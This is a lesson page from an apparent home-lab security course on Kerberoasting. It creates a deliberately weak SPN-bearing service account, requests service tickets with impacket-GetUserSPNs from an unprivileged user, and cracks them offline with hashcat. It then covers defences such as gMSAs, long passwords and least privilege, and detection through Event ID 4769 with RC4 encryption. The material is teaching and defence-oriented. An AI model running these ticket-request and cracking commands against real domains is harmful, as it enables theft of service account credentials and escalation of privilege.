---
title: "14.5 Asking the directory for credentials"
sidebar_position: 5
---

# 14.5 Asking the directory for credentials

In lesson 5.5 you watched Kerberos hand out tickets and I said the tickets,
not the password, were what crossed the network. That was true and it was
presented as reassuring.

This lesson is the part that is not reassuring, and it follows from the same
design.

## The mechanism, which you already know most of

Recall how Kerberos works from lesson 5.5. When you want to use a service,
you ask the domain controller for a ticket to that service. The domain
controller gives you one, **encrypted with the service account's password
hash**, so that only the service can open it.

Now read that sentence as an attacker.

**Any authenticated user may request a ticket for any service.** That is not
a flaw; it is how the protocol distributes access. And the ticket you get
back is encrypted with the service account's password. So an ordinary user
can ask for, and receive, a blob of data encrypted with a service account's
password, and then take it away and try passwords against it offline for as
long as they like.

**Nothing is broken. Nothing failed. The directory did exactly what it is
supposed to do**, and the attacker walked away with material to crack.

This is called **Kerberoasting**, and the reason it matters so much in
practice is what service accounts tend to be: created years ago, with
passwords that never rotate, and far more privilege than they need.

## Set up a target

Your lab has no service accounts yet, so create one. **This is deliberately a
badly configured account**, because the badness is the lesson.

On DC01, as your `.adm` account:

```powershell
# A service account with a weak, guessable password. This is a
# lab. Never do this anywhere else, which the rest of the lesson
# will make viscerally obvious.
New-ADUser -Name "svc-sql" `
           -SamAccountName "svc-sql" `
           -UserPrincipalName "svc-sql@lab.internal" `
           -Path "OU=Users,OU=Lab,DC=lab,DC=internal" `
           -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) `
           -Enabled $true

# The SPN is what makes it Kerberoastable. A Service Principal
# Name tells Kerberos "tickets for this service go to this
# account", which is what lets anyone request one.
Set-ADUser -Identity "svc-sql" -ServicePrincipalNames @{Add="MSSQLSvc/db01.lab.internal:1433"}
```

**How you know it worked:**

```powershell
# The account exists and carries an SPN. The SPN is the whole
# prerequisite; without it the account is not a target.
Get-ADUser -Identity svc-sql -Properties ServicePrincipalNames |
    Select-Object SamAccountName, ServicePrincipalNames
```

**If `New-ADUser` rejects the password**, that is lesson 5.6's complexity
policy. Pick something that satisfies it but is still in a wordlist, which is
the realistic case anyway.

## Ask for the ticket

From KALI01, as your **unprivileged** user:

```bash
# Request tickets for every account in the domain that has an SPN.
# -request means "and give me the encrypted material".
impacket-GetUserSPNs lab.internal/sokoth -dc-ip 10.10.10.10 -request
```

It prompts for `sokoth`'s password, then prints a list of accounts with SPNs
and, for each, a long string beginning `$krb5tgs$`.

**How you know it worked:** you have at least one `$krb5tgs$` block, for
`svc-sql`.

**Stop and look at what you are holding.** You are an ordinary user with no
privileges. You just received, from the domain controller, cryptographic
material derived from a service account's password. You did not exploit
anything. You asked, and it said yes.

Save it:

```bash
impacket-GetUserSPNs lab.internal/sokoth -dc-ip 10.10.10.10 -request \
  -outputfile ~/roasted.txt
```

## Crack it offline

```bash
# hashcat mode 13100 is Kerberos TGS-REP. rockyou is the standard
# wordlist and ships with Kali, compressed.
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz

hashcat -m 13100 ~/roasted.txt /usr/share/wordlists/rockyou.txt
```

**How you know it worked:** hashcat prints the hash followed by `:` and the
plaintext password, and reports `Status: Cracked`.

**If it exhausts the wordlist without cracking**, your password was not in
it. That is a good outcome in real life and an inconvenient one in a lab; add
your chosen password to a small file and run against that to see the
mechanism work, then think about why the wordlist mattered so much.

**The offline part is the point.** No failed logins. No account lockout. No
network traffic at all during cracking. The domain controller has no idea
this is happening and cannot have, because it ended its involvement the
moment it issued a legitimate ticket.

## What actually defends against this

Because you should never leave an attack lesson without the answer.

**Long passwords on service accounts.** This is the real defence and it is
almost the only one. Cracking cost rises with length, and a 25-character
random password is not in any wordlist and not worth brute-forcing. It costs
nothing, because no human types it.

**Group Managed Service Accounts.** You met these in lesson 8.8, when AD FS
needed one. Windows generates a 120-character password and rotates it
automatically, which makes Kerberoasting pointless. **This is why gMSAs
exist**, and lesson 8.8 taught you the mechanism without the motivation.
Here is the motivation.

**Least privilege, again.** A cracked service account with no rights is a
nuisance; one in Domain Admins is the end of the assessment. Check yours:

```powershell
Get-ADUser -Identity svc-sql -Properties MemberOf | Select-Object -ExpandProperty MemberOf
```

**Not "detect the request", which is where people start.** You can alert on
ticket requests, and it produces enormous noise, because legitimate ticket
requests happen constantly.

## What it looked like from the defensive side

This one **is** detectable, unlike lesson 14.4, and the difference is
instructive.

Look for **Event ID 4769**, "A Kerberos service ticket was requested", on
DC01. Your request is in there.

The signal is not the event, which is completely normal, but the pattern:

- **Encryption type `0x17`** (RC4). Modern clients negotiate AES. A ticket
  request specifying RC4 is a strong hint, because attackers request the
  weaker algorithm deliberately, as it cracks faster.
- **One account requesting tickets for many services at once**, which is what
  `-request` with no target does.

Search your Wazuh dashboard for 4769 events around the time you ran it.

**If you see them, write a rule**, using lesson 12.4's process. This is a
genuinely good detection to have and a realistic one to write.

**If you see nothing at all**, you have found a collection gap rather than a
detection gap, and they are different problems. Kerberos events come from the
domain controller's security log, which lesson 12.2 should have enrolled.
Check the agent is reporting, then check whether the events are being
collected at all before you go writing rules for events you do not have.

That distinction, **is it not collected or not detected**, is one of the most
useful triage questions in the job.

## Clean up

```powershell
# Remove the deliberately weak account. It has served its purpose
# and it is now a real weakness in your lab.
Remove-ADUser -Identity svc-sql -Confirm:$false
```

**How you know it worked:**

```powershell
# Expect an error saying it cannot be found. That is success here.
Get-ADUser -Identity svc-sql
```

## What you take from this

An ordinary user obtained crackable material for a privileged account by
asking politely, and you now know why gMSAs exist and why service account
passwords are the ones that should be longest.

You also have a detection worth writing, which is the first one in this
module that is genuinely achievable.
